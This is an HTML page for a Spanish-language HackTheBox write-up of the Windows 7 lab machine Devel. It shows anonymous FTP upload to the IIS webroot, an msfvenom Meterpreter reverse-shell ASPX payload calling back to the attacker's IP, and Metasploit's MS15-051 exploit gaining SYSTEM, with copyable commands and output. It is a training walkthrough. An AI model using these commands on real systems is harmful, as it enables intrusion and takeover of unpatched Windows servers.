@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Devel — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Devel de HackTheBox (Windows 7, Fácil): FTP anónimo con escritura sobre el webroot de IIS permite subir una webshell ASPX, y MS15-051 (win32k.sys) escala de IIS APPPOOL\Web a NT AUTHORITY\SYSTEM.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/facil/devel.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Devel — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Devel de HackTheBox (Windows 7, Fácil): FTP anónimo con escritura sobre el webroot de IIS permite subir una webshell ASPX, y MS15-051 (win32k.sys) escala de IIS APPPOOL\Web a NT AUTHORITY\SYSTEM.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/facil/devel.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/devel.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Devel — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Devel de HackTheBox (Windows 7, Fácil): FTP anónimo con escritura sobre el webroot de IIS permite subir una webshell ASPX, y MS15-051 (win32k.sys) escala de IIS APPPOOL\Web a NT AUTHORITY\SYSTEM.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/devel.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Devel — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Devel de HackTheBox (Windows 7, Fácil): FTP anónimo con escritura sobre el webroot de IIS permite subir una webshell ASPX, y MS15-051 (win32k.sys) escala de IIS APPPOOL\\Web a NT AUTHORITY\\SYSTEM.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/devel.html", "image": "https://brandeiks.github.io/assets/og/devel.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/facil/devel.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>devel</span>
+    </div>
+    <h1 class="writeup-title">DE<span>VEL</span></h1>
+    <p class="writeup-subtitle">// FTP anónimo sobre el webroot de IIS → webshell ASPX → MS15-051 → SYSTEM</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-windows">WINDOWS 7</span>
+      <span class="meta-badge badge-ftp">FTP ANÓNIMO</span>
+      <span class="meta-badge badge-upload">WEBSHELL ASPX</span>
+      <span class="meta-badge badge-msf">MS15-051</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento y FTP</a></li>
+        <li><a href="#webshell">02 · Webshell ASPX</a></li>
+        <li><a href="#escalada">03 · MS15-051 a SYSTEM</a></li>
+        <li><a href="#cmdref">04 · Referencia Comandos</a></li>
+        <li><a href="#glosario">05 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Devel</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Windows 7 (build 7600)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-green">Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">IIS 7.5 + Microsoft ftpd</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">FTP anónimo = <span>webroot de IIS</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>shell.aspx</span> subido por FTP</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">ejecutado por HTTP → <span>IIS APPPOOL\Web</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">local_exploit_suggester → <span>MS15-051</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>NT AUTHORITY\SYSTEM</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECONOCIMIENTO Y FTP ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento y FTP</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">RECONOCIMIENTO</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.191">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -n -Pn -sS --min-rate</span> <span class="arg">3000</span> <span class="flag">--max-retries</span> <span class="arg">1</span> <span class="arg">10.129.5.191</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>21/tcp open  ftp   Microsoft ftpd</div>
+        <div><span class="o-green">80/tcp open  http  Microsoft IIS httpd 7.5</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          <strong>FTP + IIS en la misma máquina</strong> es una combinación con una hipótesis clara: si el FTP escribe
+          donde el IIS lee, cualquier fichero subido es una posible ejecución.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">CONFIRMAR QUE EL FTP ES EL WEBROOT</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s 'ftp://10.129.5.191/' --user 'anonymous:anonymous'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">FTP</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s</span> <span class="arg">'ftp://10.129.5.191/'</span> <span class="flag">--user</span> <span class="arg">'anonymous:anonymous'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client</div>
+        <div><span class="o-green">03-17-17  05:37PM                  689 iisstart.htm</span></div>
+        <div><span class="o-green">03-17-17  05:37PM               184946 welcome.png</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// FTP ANÓNIMO SOBRE EL WEBROOT</p>
+        <p>
+          <strong>Dónde:</strong> FTP acepta <code>anonymous:anonymous</code> y el listado coincide exactamente con los
+          ficheros por defecto de IIS.<br>
+          <strong>Qué permite:</strong> el directorio raíz del FTP es <code>C:\inetpub\wwwroot</code> — cualquier cosa
+          subida ahí queda servida por la web.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 WEBSHELL ASPX ===================== -->
+    <div class="section" id="webshell">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Webshell ASPX</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">SUBIR Y EJECUTAR LA SHELL</span>
+      </div>
+      <div class="cmd-block" data-cmd="msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f aspx -o /tmp/shell.aspx; curl -T /tmp/shell.aspx 'ftp://10.129.5.191/shell.aspx' --user 'anonymous:anonymous'; curl 'http://10.129.5.191/shell.aspx'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">WEBSHELL</span>
+        <div><span class="prompt">$ </span><span class="cmd">msfvenom <span class="flag">-p</span> <span class="arg">windows/meterpreter/reverse_tcp</span> <span class="arg">LHOST=10.10.16.12 LPORT=4444</span> <span class="flag">-f</span> <span class="arg">aspx</span> <span class="flag">-o</span> <span class="arg">/tmp/shell.aspx</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-T</span> <span class="arg">/tmp/shell.aspx</span> <span class="arg">'ftp://10.129.5.191/shell.aspx'</span> <span class="flag">--user</span> <span class="arg">'anonymous:anonymous'</span></span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">'http://10.129.5.191/shell.aspx'</span>   <span class="comment"># con el handler de msf escuchando</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>226 Transfer complete.</div>
+        <div><span class="o-green">[*] Meterpreter session 1 opened (... -&gt; 10.129.5.191)</span></div>
+        <div><span class="o-green">IIS APPPOOL\Web @ DEVEL</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          IIS no distingue de dónde vino el fichero: si llega por FTP a <code>wwwroot</code> y tiene extensión
+          <code>.aspx</code>, se interpreta y ejecuta igual que cualquier página legítima.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 MS15-051 A SYSTEM ===================== -->
+    <div class="section" id="escalada">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">MS15-051 a SYSTEM</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">BUSCAR EL EXPLOIT LOCAL APLICABLE</span>
+      </div>
+      <div class="cmd-block" data-cmd="run post/multi/recon/local_exploit_suggester">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">METERPRETER</span>
+        <div><span class="prompt">meterpreter &gt; </span><span class="cmd">run post/multi/recon/local_exploit_suggester</span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// MS15-051 (win32k.sys)</p>
+        <p>
+          <strong>Dónde:</strong> el controlador <code>win32k.sys</code> de este Windows 7 build 7600 sin hotfixes.<br>
+          <strong>Qué permite:</strong> el fallo permite robar el token de un proceso SYSTEM desde un proceso de bajo
+          privilegio (<code>IIS APPPOOL\Web</code>).
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">LANZAR EL EXPLOIT Y LEER LAS FLAGS</span>
+      </div>
+      <div class="cmd-block" data-cmd="use exploit/windows/local/ms15_051_client_copy_image; set SESSION 1; set LHOST 10.10.16.12; set LPORT 5555; exploit -j">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">METASPLOIT</span>
+        <div><span class="prompt">msf6 &gt; </span><span class="cmd">use exploit/windows/local/ms15_051_client_copy_image</span></div>
+        <div><span class="prompt">msf6 &gt; </span><span class="cmd">set SESSION <span class="arg">1</span></span></div>
+        <div><span class="prompt">msf6 &gt; </span><span class="cmd">exploit <span class="flag">-j</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">Meterpreter session 5 opened (NT AUTHORITY\SYSTEM @ DEVEL)</span></div>
+        <div><span class="o-cyan">[flag oculta]</span>   <span class="comment"># C:\Users\babis\Desktop\user.txt</span></div>
+        <div><span class="o-cyan">[flag oculta]</span>   <span class="comment"># C:\Users\Administrator\Desktop\root.txt</span></div>
+      </div>
+      <div class="warn-box">
+        <p class="warn-box-title">// OJO</p>
+        <p>
+          Las sesiones 2, 3 y 4 eran reconexiones del mismo payload (<code>IIS APPPOOL\Web</code>); la que importa es la
+          <strong>última</strong>, la 5, que ya corre como SYSTEM — conviene listar sesiones y entrar en la correcta,
+          no en la primera que aparece.
+        </p>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAGS</p>
+        <p>
+          <strong>user:</strong> [flag oculta] · <strong>root:</strong> [flag oculta].
+          Ruta completa: FTP anónimo con escritura en el webroot → webshell ASPX → MS15-051 → SYSTEM.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">msfvenom (ASPX)</div>
+          <div class="cmd-ref-syntax">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=puerto -f aspx -o shell.aspx</div>
+          <div class="cmd-ref-desc">Genera una webshell ASPX con un payload Meterpreter embebido.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">curl -T (FTP upload)</div>
+          <div class="cmd-ref-syntax">curl -T archivo ftp://IP/nombre --user usuario:pass</div>
+          <div class="cmd-ref-desc">Sube un archivo por FTP sin necesitar el cliente interactivo.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">local_exploit_suggester</div>
+          <div class="cmd-ref-syntax">run post/multi/recon/local_exploit_suggester</div>
+          <div class="cmd-ref-desc">Módulo de Metasploit que, desde una sesión activa, sugiere qué exploits locales son aplicables según el sistema.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">exploit/windows/local/ms15_051_client_copy_image</div>
+          <div class="cmd-ref-syntax">use ... ; set SESSION N ; exploit -j</div>
+          <div class="cmd-ref-desc">Explota MS15-051 sobre una sesión ya establecida para robar un token SYSTEM.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 05 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Webroot compartido con FTP</div>
+          <div class="glos-def">
+            Configuración donde el directorio raíz del FTP y el que sirve el servidor web son el mismo. Cualquier
+            archivo ejecutable subido por FTP queda disponible para ejecutarse vía HTTP.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">ASPX</div>
+          <div class="glos-def">
+            Extensión de las páginas ASP.NET, interpretadas y ejecutadas por IIS. Una webshell ASPX se comporta como
+            cualquier página legítima de la aplicación.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">IIS APPPOOL\Web</div>
+          <div class="glos-def">
+            Cuenta virtual con la que corre el <em>application pool</em> de un sitio IIS. Tiene privilegios limitados,
+            el punto de partida habitual antes de escalar.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">MS15-051 (win32k.sys)</div>
+          <div class="glos-def">
+            Vulnerabilidad de escalada de privilegios en el controlador de ventanas de Windows, corregida en mayo de
+            2015. Afecta a sistemas sin ese parche instalado.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">local_exploit_suggester</div>
+          <div class="glos-def">
+            Módulo de Metasploit que, a partir de una sesión y la información del sistema, enumera qué módulos de
+            escalada local tienen más probabilidad de funcionar.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="tabby.html"><span class="dir">← ANTERIOR</span><span class="nombre">Tabby</span></a><a class="siguiente" href="active.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Active</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="active.html"><span class="nombre">Active</span><span class="meta">hackthebox · facil · Active Directory</span></a><a class="rel-card" href="../muy-facil/explosion.html"><span class="nombre">Explosion</span><span class="meta">hackthebox · muy-facil · Windows</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Devel · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "DEVEL", "plataforma": "hackthebox", "dificultad": "facil", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/devel.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
